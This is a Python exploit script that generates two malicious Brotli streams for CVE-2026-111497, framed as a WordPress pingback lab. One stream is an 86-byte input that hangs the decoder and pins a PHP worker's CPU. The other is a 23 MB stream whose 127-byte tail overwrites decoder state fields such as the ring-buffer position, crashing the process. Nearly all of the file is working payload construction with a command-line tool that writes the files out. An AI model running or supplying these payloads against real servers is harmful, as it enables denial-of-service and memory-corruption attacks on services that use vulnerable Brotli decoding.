#!/usr/bin/env python3
"""Payload generator for the CVE-2026-111497 WordPress pingback lab.

This file produces two *crash/DoS only* payloads.  It does not contain an
RCE payload, heap grooming, or a `system()` hijack.

  1. ``build_hang_payload()``  -- 86 bytes
     The 22-byte stream from Node.js' regression test for the Brotli
     decoder (test/parallel/test-zlib-invalid-input.js).  In the vulnerable
     decoder this reaches a block switch that the stream itself made
     impossible and then returns NEEDS_MORE_INPUT without making progress.
     libcurl's brotli write loop feeds the same bytes forever, pinning the
     PHP worker at 100% CPU.

  2. ``build_crash_payload()`` -- ~23 MB
     A 16 MiB compressed metablock containing 2^24 zero-output dictionary
     commands.  The commands exhaust the distance block length while
     producing no output, leaving the decoder with a one-byte partial
     buffer.  Three padding bytes and a 127-byte tail then drive the
     internal ring-buffer copy with an attacker-controlled (negative)
     ``pos``.  The 16-byte copy lands about 1 GiB below the ring buffer,
     which is unmapped, and the process dies with SIGSEGV.

Stream layout and command construction follow the public analysis of
CVE-2026-111497:

  * google/brotli commit 0ed4268a4401abcb44720963
    ("Detect and report invalid stream earlier")
  * Node.js regression test test/parallel/test-zlib-invalid-input.js
  * TheFool-TAROT/CVE-2026-111497-brotli-pwn (gen_stream.py, dos.br)
  * dimasma0305/CVE-2026-111497-POC

The crash tail in this file is deliberately different from the public RCE
proofs: it sets ``pos`` to a wild value instead of a heap-groomed offset.

Run:
    python3 payload.py hang   /tmp/hang.br
    python3 payload.py crash  /tmp/crash.br
    python3 payload.py info
"""

from __future__ import annotations

import pathlib
import struct
import sys

# 22-byte trigger from Node.js' regression test.  The padding makes the
# decoder return NEEDS_MORE_INPUT while input is still available, so the
# caller's loop cannot make progress.
HANG_SEED = bytes.fromhex("200010414141fcffff07002228f00b60f7f41f000000")
HANG_PAD = b"\x00" * 64

# Size of the generated crash stream.  Kept as an assertion so a change in
# the bit writer fails loudly instead of silently producing a non-trigger.
CRASH_STREAM_SIZE = 23_068_690
CRASH_TAIL_SIZE = 127


class BitWriter:
    """LSB-first bit writer, matching the Brotli bit stream format."""

    def __init__(self) -> None:
        self.data = bytearray()
        self.value = 0
        self.used = 0

    def put(self, value: int, count: int) -> None:
        for bit_index in range(count):
            self.value |= ((value >> bit_index) & 1) << self.used
            self.used += 1
            if self.used == 8:
                self.data.append(self.value)
                self.value = 0
                self.used = 0

    def align(self, blob: bytes) -> None:
        if self.used:
            raise ValueError("writer is not byte-aligned")
        self.data.extend(blob)

    def finish(self) -> bytes:
        if self.used:
            self.data.append(self.value)
            self.value = 0
            self.used = 0
        return bytes(self.data)


def one_symbol_tree(bits: BitWriter, alphabet_size: int, symbol: int) -> None:
    """Write a simple Huffman tree containing exactly one symbol."""
    bits.put(1, 2)  # simple tree
    bits.put(0, 2)  # one symbol
    bits.put(symbol, (alphabet_size - 1).bit_length())


def varlen_u8(bits: BitWriter, value: int) -> None:
    """Brotli's variable-length uint8 encoding (used for block type counts)."""
    if value == 0:
        bits.put(0, 1)
        return
    bits.put(1, 1)
    if value == 1:
        bits.put(0, 3)
        return
    width = value.bit_length() - 1
    bits.put(width, 3)
    bits.put(value - (1 << width), width)


def build_stream() -> bytes:
    """Build the 16 MiB / 2^24-command trigger metablock."""
    bits = BitWriter()

    # Stream window: WBITS = 10 -> 1 KiB ring buffer.
    bits.put(1, 1)
    bits.put(0, 3)
    bits.put(2, 3)

    # Non-final compressed metablock, 6 MLEN nibbles, MLEN + 1 = 2^24.
    bits.put(0, 1)
    bits.put(2, 2)
    bits.put(0xFFFFFF, 24)
    bits.put(0, 1)  # compressed

    varlen_u8(bits, 0)  # one literal block type
    varlen_u8(bits, 1)  # two command block types
    one_symbol_tree(bits, 4, 0)
    one_symbol_tree(bits, 26, 25)
    bits.put(0xFFFFFF, 24)  # command block length > 2^24
    varlen_u8(bits, 0)  # one distance block type
    bits.put(3, 6)  # NPOSTFIX=3, NDIRECT=0
    bits.put(0, 2)  # literal context mode
    varlen_u8(bits, 0)  # one literal context tree
    varlen_u8(bits, 0)  # one distance context tree

    one_symbol_tree(bits, 256, 0)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 400, 184)

    # Each command is an 11-bit distance extra value.  It selects dictionary
    # transform OMIT_LAST_7 for a four-byte word: zero output, but it still
    # decrements the distance block length.
    distance_extra = 4
    command_count = 1 << 24

    # Finish the current partial byte first, then write whole groups of eight
    # commands (88 bits = 11 bytes) in bulk.
    completed = 0
    while bits.used and completed < command_count:
        bits.put(distance_extra, 11)
        completed += 1

    group = BitWriter()
    for _ in range(8):
        group.put(distance_extra, 11)
    group_bytes = group.finish()
    groups, tail = divmod(command_count - completed, 8)
    bits.align(group_bytes * groups)
    for _ in range(tail):
        bits.put(distance_extra, 11)

    result = bits.finish()
    if len(result) != CRASH_STREAM_SIZE:
        raise AssertionError(
            f"unexpected stream length: {len(result)} "
            f"(expected {CRASH_STREAM_SIZE})"
        )
    return result


def build_hang_payload() -> bytes:
    """86-byte non-progressing decoder loop (worker hang / kill)."""
    return HANG_SEED + HANG_PAD


def build_crash_tail() -> bytes:
    """127-byte tail that corrupts BrotliDecoderState and causes SIGSEGV.

    Layout is for the x86-64 Brotli 1.1.0/1.2.0 decoder:

        tail[7]       -> state + 80  buffer_length
        tail[15..18]  -> state + 88  pos
        tail[19..22]  -> state + 92  max_backward_distance
        tail[23..26]  -> state + 96  max_distance

    Setting ``pos`` to -1 GiB turns the ring-buffer memmove16 into a write
    to an unmapped address.  No RCE is attempted.
    """
    tail = bytearray(CRASH_TAIL_SIZE)
    tail[7] = 8  # keep the copy loop going past the 8-byte inline buffer
    struct.pack_into("<i", tail, 15, -0x40000000)  # pos = -1 GiB
    struct.pack_into("<I", tail, 19, 0x7FFFFFFF)  # max_backward_distance
    struct.pack_into("<I", tail, 23, 0x7FFFFFFF)  # max_distance
    return bytes(tail)


def build_crash_payload() -> bytes:
    """23 MB trigger: stream + 3 pad bytes + crash tail."""
    return build_stream() + b"\x00" * 3 + build_crash_tail()


def _write(path: str, data: bytes) -> None:
    destination = pathlib.Path(path)
    destination.write_bytes(data)
    print(f"{destination}: {len(data)} bytes")


def main(argv: list[str]) -> int:
    if len(argv) < 2 or argv[1] in ("-h", "--help"):
        print(__doc__)
        return 0

    command = argv[1]
    if command == "info":
        print(f"hang payload : {len(build_hang_payload())} bytes")
        print(f"crash payload: {CRASH_STREAM_SIZE + 3 + CRASH_TAIL_SIZE} bytes")
        print(f"crash stream : {CRASH_STREAM_SIZE} bytes")
        return 0
    if command == "hang":
        _write(argv[2] if len(argv) > 2 else "hang.br", build_hang_payload())
        return 0
    if command == "crash":
        _write(argv[2] if len(argv) > 2 else "crash.br", build_crash_payload())
        return 0

    print(f"unknown command: {command}", file=sys.stderr)
    return 2


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
